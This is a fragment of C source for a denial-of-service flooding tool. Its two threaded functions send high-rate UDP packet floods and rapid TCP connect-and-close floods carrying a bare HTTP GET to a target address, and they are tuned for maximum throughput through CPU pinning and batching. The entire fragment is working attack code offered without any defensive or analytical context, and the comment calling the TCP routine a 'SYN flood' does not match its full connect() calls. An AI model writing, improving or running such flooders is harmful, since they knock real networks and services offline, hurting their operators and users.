// UDP Flood - High PPS + Bandwidth
void *udp_thread(void *arg) {
    int thread_id = (long)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) sock = global_sock;
    
    int buf_size = SOCKET_BUFFER_SIZE;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
    
    // CPU affinity for better performance
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    unsigned long long local_sent = 0;
    unsigned long long local_bytes = 0;
    
    // Pre-fetch payload lengths
    int payload_lens[udp_payload_count];
    for (int i = 0; i < udp_payload_count; i++) payload_lens[i] = strlen(udp_payloads[i]);
    
    while (running) {
        // Send multiple packets per loop for better throughput
        for (int b = 0; b < BATCH_SIZE && running; b++) {
            int idx = rand() % udp_payload_count;
            int len = payload_lens[idx];
            if (sendto(sock, udp_payloads[idx], len, 0,
                       (struct sockaddr*)&global_dest, sizeof(global_dest)) > 0) {
                local_sent++;
                local_bytes += len;
            }
        }
        sched_yield();
    }
    
    __sync_fetch_and_add(&total_sent, local_sent);
    __sync_fetch_and_add(&total_bytes, local_bytes);
    if (sock != global_sock) close(sock);
    return NULL;
}

// TCP SYN Flood - Fast connect/disconnect
void *tcp_thread(void *arg) {
    char *ip = (char*)arg;
    int port = *(int*)(arg + 64);
    int thread_id = *(int*)(arg + 128);
    unsigned long long local_sent = 0;
    
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    struct sockaddr_in dest = {.sin_family = AF_INET, .sin_port = htons(port)};
    dest.sin_addr.s_addr = inet_addr(ip);
    
    while (running) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        fcntl(sock, F_SETFL, O_NONBLOCK);
        connect(sock, (struct sockaddr*)&dest, sizeof(dest));
        send(sock, "GET / HTTP/1.1\r\n\r\n", 18, MSG_NOSIGNAL);
        close(sock);
        local_sent++;
        if ((local_sent & 0xFF) == 0) sched_yield();
    }
    __sync_fetch_and_add(&total_sent, local_sent);
    return NULL;
}

